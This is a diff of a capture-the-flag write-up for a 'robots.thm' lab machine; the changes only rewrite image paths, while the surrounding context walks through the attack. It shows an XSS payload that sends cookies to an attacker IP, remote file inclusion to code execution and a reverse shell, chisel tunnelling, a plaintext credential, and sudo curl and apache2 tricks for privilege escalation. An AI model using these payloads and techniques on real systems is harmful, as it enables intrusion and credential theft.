@@ -53,11 +53,11 @@ If we go to `/harm/to/self`, we get redirected to `robots.thm`, let's add it to 
 echo '10.10.45.12 robots.thm' | sudo tee -a /etc/hosts
 ```
 
-![](cybersecurity/images/Pasted%2520image%252020250314141610.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250314141610.png)
 
 If we go to register, we can see this:
 
-![](cybersecurity/images/Pasted%2520image%252020250314141630.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250314141630.png)
 
 We can try registering a username and check the behavior, the way the password gets structured the first time is already told by the page, this is a big hint, let's keep on going, for example, let's create an account with these credentials:
 
@@ -73,15 +73,15 @@ echo -n "testuser0505" | md5sum
 ```
 
 
-![](cybersecurity/images/Pasted%2520image%252020250314150509.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250314150509.png)
 
 We get a redirection to `index.php`, we can also see something interesting in here:
 
-![](cybersecurity/images/Pasted%2520image%252020250314150624.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250314150624.png)
 
 We got something called `server_info`, something way too interesting in here is this:
 
-![](cybersecurity/images/Pasted%2520image%252020250314150733.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250314150733.png)
 
 For example `allow_url_fopen`, `allow_url_include` and `file_uploads` are enabled, this means that this page could be vulnerable to LFI, let's try to search for a way to exploit this. 
 
@@ -90,7 +90,7 @@ For example `allow_url_fopen`, `allow_url_include` and `file_uploads` are enable
 
 Going back at the register page, I tried registering an username using `xss`, a simple xss payload at the username, then, i tried logging in and this happened:
 
-![](cybersecurity/images/Pasted%2520image%252020250314181227.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250314181227.png)
 
 There we go, XSS is possible in this page, we can craft a payload to get admin
 cookie and bypass the login page, let's register a username with these credentials:
@@ -108,7 +108,7 @@ echo -n "<script>fetch("http://10.6.34.159:8000/?cookie="+document.cookie)</scri
 If we try getting our cookie, we are unable to do so, due to this:
 
 
-![](cybersecurity/images/Pasted%2520image%252020250317143641.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250317143641.png)
 
 The `HttpOnly` flag is set in the server, this prevents JS to access the cookie, we can exploit this in other way though, let's use this script:
 
@@ -132,7 +132,7 @@ xhr.send(null);
 
 We can find this in HackTricks, we just needed to adapt the content to steal the cookie only:
 
-![](cybersecurity/images/Pasted%2520image%252020250317143941.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250317143941.png)
 
 
 Now, let's register an username with the following:
@@ -142,12 +142,12 @@ Now, let's register an username with the following:
 ```
 
 
-![](cybersecurity/images/Pasted%2520image%252020250317144124.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250317144124.png)
 
 
 We can see this in our python server:
 
-![](cybersecurity/images/Pasted%2520image%252020250317144147.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250317144147.png)
 
 Got our cookie:
 
@@ -158,11 +158,11 @@ Got our cookie:
 Let's change our value and login as admin:
 
 
-![](cybersecurity/images/Pasted%2520image%252020250317144245.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250317144245.png)
 
 We find out a test URL site, we can try some techniques such as trying the LFI, let's try, first, let's set up a python server and point out our own URL:
 
-![](cybersecurity/images/Pasted%2520image%252020250317151014.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250317151014.png)
 
 We get a directory listing for our server, we can try exploiting this with the inclusion we found on the `server_info.php` file, let's try some basic RCE:
 
@@ -175,7 +175,7 @@ system('id');
 
 Let's save that file as `id.php` and send the request pointing that resource:
 
-![](cybersecurity/images/Pasted%2520image%252020250317151210.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250317151210.png)
 
 There we go, we got RCE, let's send a shell:
 
@@ -185,7 +185,7 @@ There we go, we got RCE, let's send a shell:
 
 Let's save it as `shell.php` and do the same, we also need to set up a listener.
 
-![](cybersecurity/images/Pasted%2520image%252020250317151521.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250317151521.png)
 
 There we go, we got our shell, let's start privesc.
 
@@ -204,15 +204,15 @@ Let's start by stabilizing our shell:
 5. export TERM=xterm
 6. export BASH=bash
 
-![](cybersecurity/images/Pasted%2520image%252020250317152103.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250317152103.png)
 
 We got a stable shell now, let's look around, we got this:
 
-![](cybersecurity/images/Pasted%2520image%252020250317152134.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250317152134.png)
 
 Got a `config.php` file, let's read it:
 
-![](cybersecurity/images/Pasted%2520image%252020250317152150.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250317152150.png)
 
 Found ourselves credentials:
 
@@ -222,12 +222,12 @@ robots:q4qCz1OflKvKwK4S
 
 If we try these credentials in ssh, they don't work, we need to keep searching around, for example, at `/`, we find this:
 
-![](cybersecurity/images/Pasted%2520image%252020250317152505.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250317152505.png)
 
 We found a `.dockerenv` file, this could mean we are inside of a docker environment, let's search `/etc/hosts`:
 
 
-![](cybersecurity/images/Pasted%2520image%252020250317152549.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250317152549.png)
 
 And it was right, we are inside of a docker container, we can try using [chisel](https://github.com/jpillora/chisel), let's do the following:
 
@@ -251,26 +251,26 @@ chmod +x chisel
 
 We now receive a connection in our local machine chisel:
 
-![](cybersecurity/images/Pasted%2520image%252020250317154806.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250317154806.png)
 
 
 We can now access the db:
 
-![](cybersecurity/images/Pasted%2520image%252020250317155125.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250317155125.png)
 
 
 We can find this inside the db:
 
-![](cybersecurity/images/Pasted%2520image%252020250317155227.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250317155227.png)
 
 We got the password for another user `rgiskard`, the interesting thing in here is that the md5 hash does not coincide with the one registered at the site, so, we need to reconstruct the hash, for this, we must understand the hash, let's go to CyberChef to analyze our hash, let's remember that we set the script account with the date of `01/01/2000`, so we need to do the hash like this:
 
 
-![](cybersecurity/images/Pasted%2520image%252020250317155600.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250317155600.png)
 
 If we use MD5 again:
 
-![](cybersecurity/images/Pasted%2520image%252020250317155615.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250317155615.png)
 
 
 Now, this do match the hash in the db, let's use this python script to reconstruct the hash:
@@ -330,15 +330,15 @@ Double MD5: dfb35334bf2a1338fa40e5fbb4ae4753
 
 We got the password, let's go into ssh, we need to use the first MD5 hash:
 
-![](cybersecurity/images/Pasted%2520image%252020250317155933.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250317155933.png)
 
 Let's check our privileges:
 
-![](cybersecurity/images/Pasted%2520image%252020250317160010.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250317160010.png)
 
 We can use `curl` with wildcard as the user `dolivaw`, let's check GTFOBINS:
 
-![](cybersecurity/images/Pasted%2520image%252020250317164324.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250317164324.png)
 
 Let's reproduce these steps, for example, the right path to go would be testing how this works first, let's point out at a test resource:
 
@@ -348,11 +348,11 @@ sudo -u dolivaw /usr/bin/curl 127.0.0.1/ -o /tmp/test.txt
 
 If we check the file now:
 
-![](cybersecurity/images/Pasted%2520image%252020250317164513.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250317164513.png)
 
 But, what we need to find is who this file belongs to, either `dolivaw` or our user:
 
-![](cybersecurity/images/Pasted%2520image%252020250317164614.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250317164614.png)
 
 It belongs to the `dolivaw` user, we can use this to escalate our privileges by modifying the authorized keys in ssh:
 
@@ -370,17 +370,17 @@ And now, we can login as `dolivaw` using this:
 sudo ssh dolivaw@robots.thm -i id_rsa
 ```
 
-![](cybersecurity/images/Pasted%2520image%252020250317165458.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250317165458.png)
 
 At this point we can read `user.txt` but let's continue onto root, let's check our privileges:
 
 
-![](cybersecurity/images/Pasted%2520image%252020250317165535.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250317165535.png)
 
 Let's search this on GTFOBINS:
 
 
-![](cybersecurity/images/Pasted%2520image%252020250317165608.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250317165608.png)
 
 We can read the root flag with this:
 
@@ -392,7 +392,7 @@ sudo -u root /usr/sbin/apache2 -C "DEFINE APACHE_RUN_DIR /tmp" -C "Include /root
 
 And we get this:
 
-![](cybersecurity/images/Pasted%2520image%252020250317170005.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250317170005.png)
 
 We got our root flag, this is the short path, we can get a root shell exploiting this too, but for the simplicity of things, let's just read the root flag and end the CTF.
 
